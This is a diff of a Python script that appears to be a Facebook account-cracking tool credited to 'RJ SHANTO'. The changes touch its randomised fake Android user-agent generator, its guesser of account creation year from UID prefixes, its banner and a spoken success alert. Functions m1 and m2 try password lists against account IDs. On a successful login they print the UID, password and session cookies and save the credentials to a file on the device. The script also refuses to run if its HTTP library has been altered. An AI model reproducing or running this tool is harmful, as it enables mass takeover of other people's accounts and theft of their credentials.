@@ -147,29 +147,24 @@ else:
     exit('\033[1;32mWE DETECTED SOME CHANGES INTO YOUR REQEUESTS FILES')
 #-----[UserAgent]-----#
 ugen = []
+ugen = []
 for agent in range(random.randint(89999, 150000)):
-    a='Mozilla/5.0 (Linux; U; Android'
-    b=random.choice(['10','11','12','13'])
-    c='; en-us; MI CC9 Pro Premium Edition Build/RKQ1.200826.002; wv)'
+    a='Mozilla/5.0 (Linux; Android'
+    b=random.choice(['9','10','11','12'])
+    c='; XIAOMI BASIC Build/NMF26F; wv)'
     d=random.randrange(7,13)
     e='en-us; GT-'
     f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
     g=random.randrange(111,999)
     h=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    i='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
+    i='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
     j=random.randrange(11,99)
     k='0'
     l=random.randrange(1111,9999)
     m=random.randrange(11,99)
-    n='Mobile Safari/537.36'
-    o='XiaoMi/MiuiBrowser/'
-    p=random.randrange(11,99)
-    q=random.randrange(11,99)
-    r=random.randrange(1,9)
-    s='-gn'
-    fullagent=f'{a} {b}{c} {d};  {e}{f}{g}{h}) {i}{j}.{k}.{l}.{m} {n} {o}{p}.{q}.{r}{s}'
+    n='Mobile Safari/537.36 AlohaBrowser/3.4.0'
+    fullagent=f'{a} {b} {c} {d};  {e}{f}{g}{h} {i}{j}.{k}.{l}.{m} {n}'
     ugen.append(fullagent)
-    
 #----------------------[CHECK CREATION YEAR]----------------#         
 def joined(ids):
     if len(ids)==15:
@@ -192,7 +187,7 @@ def joined(ids):
         elif ids[:5] in ['10006','10007']   :creation = ' 2021'
         elif ids[:5] in ['10008']           :creation = ' 2022'
         elif ids[:5] in ['10009']           :creation = ' 2023'
-        elif ids[:2] in ['61','65']         :creation = ' NEW'
+        elif ids[:2] in ['61','65']         :creation = ' 2023 | 2024'
         else:creation=''
     elif len(ids) in [9,10]:
         creation = ' 2008 | 2009'
@@ -213,17 +208,18 @@ def lock_check(uid):
     else:
         return('LIVE')
 #----------LOGO-------------#
-logo=("""
- \033[38;2;148;0;211m ░█▀▀▀█ ░█─░█ ─█▀▀█ ░█▄─░█ ▀▀█▀▀ ░█▀▀▀█ 
- \033[38;2;0;127;255m ─▀▀▀▄▄ ░█▀▀█ ░█▄▄█ ░█░█░█ ─░█── ░█──░█ 
- \033[38;2;255;204;0m ░█▄▄▄█ ░█─░█ ░█─░█ ░█──▀█ ─░█── ░█▄▄▄█\033[1;93m
-\x1b[1;93m┏─────────────────────────────────────────────┓
+logo=("""   \x1b[1;93m┏──────────────────────────────────────┓
+   \033[38;2;148;0;211m ░█▀▀▀█ ░█─░█ ─█▀▀█ ░█▄─░█ ▀▀█▀▀ ░█▀▀▀█ 
+   \033[38;2;0;127;255m ─▀▀▀▄▄ ░█▀▀█ ░█▄▄█ ░█░█░█ ─░█── ░█──░█ 
+   \033[38;2;255;204;0m ░█▄▄▄█ ░█─░█ ░█─░█ ░█──▀█ ─░█── ░█▄▄▄█\033[1;93m
+   \033[38;2;255;204;0m┗──────────────────────────────────────┛
+\x1b[1;93m┏───────────────────────────────────────────┓
 \x1b[1;93m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m 𝘈𝘜𝘛𝘏𝘖𝘙     \x1b[1;97m: \033[38;2;0;127;255mRJ SHANTO
 \x1b[1;93m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m 𝘛𝘠𝘗𝘌       \x1b[1;97m: \033[38;2;0;127;255mFERSONAL🔥
-\x1b[1;93m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m 𝘎𝘐𝘛𝘏𝘜𝘉     \x1b[1;97m: \033[38;2;0;127;255mRJ SHANTO
+\x1b[1;93m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m 𝘎𝘐𝘛𝘏𝘜𝘉     \x1b[1;97m: \033[38;2;0;127;255mSH AN TO
 \x1b[1;93m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m 𝘛𝘖𝘖𝘓       \x1b[1;97m: \033[38;2;0;127;255mFILE
-\x1b[1;93m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m 𝘝𝘌𝘙𝘚𝘐𝘖𝘕    \x1b[1;97m: \033[38;2;0;127;255m1.0.1 
-\x1b[1;93m┗─────────────────────────────────────────────┛""")  
+\x1b[1;93m \x1b[1;97m [\x1b[1;92m+\x1b[1;97m]  \x1b[1;96m 𝘝𝘌𝘙𝘚𝘐𝘖𝘕    \x1b[1;97m: \033[38;2;0;127;255m1.0.2 
+\x1b[1;93m┗───────────────────────────────────────────┛""")  
 def linex():
         print("\x1b[1;94m"+"━"*40+"\x1b[0;1m")
 def clear():
@@ -382,7 +378,7 @@ def m1(ids, names, passlist):
                 coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
                 print('\r\r\033[1;36m[RJ-OK💚]\033[1;35m ' +ids+ ' • ' +pas+ ' \n[⌛] • \033[38;2;0;128;128mJOIN DATE = \033[1;32m'+joined(ids)+' \n\033[1;31m[🍪] • \033[1;36mCOOKIES = \033[38;2;255;215;0m'+coki+ '')
                 print("\x1b[1;94m"+"━"*40+"\x1b[0;1m")
-                os.system('espeak -a 300 "RJ OK ID"')
+                os.system('espeak -a 300 "OK ID"')
                 with open('/sdcard/xRJ-OK.txt', 'a') as file:
                     file.write('UID: ' + ids + '\n')
                     file.write('Password: ' + pas + '\n')
@@ -430,7 +426,7 @@ def m2(ids, names, passlist):
                 coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
                 print('\r\r\033[1;36m[RJ SHANTO-OK💚]\033[1;35m ' +ids+ ' • ' +pas+ ' \n[⌛] • \033[38;2;0;128;128mJOIN DATE = \033[1;32m'+joined(ids)+' \n\033[1;31m[🍪] • \033[1;36mCOOKIES = \033[38;2;255;215;0m'+coki+ '')
                 print("\x1b[1;94m"+"━"*40+"\x1b[0;1m")
-                os.system('espeak -a 300 "RJ OK ID"')
+                os.system('espeak -a 300 "OK ID"')
                 with open('/sdcard/xRJ-OK.txt', 'a') as file:
                     file.write('UID: ' + ids + '\n')
                     file.write('Password: ' + pas + '\n')
